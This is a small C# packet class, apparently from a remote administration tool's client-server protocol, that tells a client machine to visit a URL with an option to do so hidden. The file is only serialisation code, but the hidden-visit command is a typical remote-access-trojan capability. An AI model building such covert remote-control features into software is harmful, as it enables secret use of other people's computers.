using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class VisitWebsite : IPacket
    {
        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool Hidden { get; set; }

        public VisitWebsite()
        {
        }

        public VisitWebsite(string url, bool hidden)
        {
            this.URL = url;
            this.Hidden = hidden;
        }

        public void Execute(Client client)
        {
            client.Send<VisitWebsite>(this);
        }
    }
}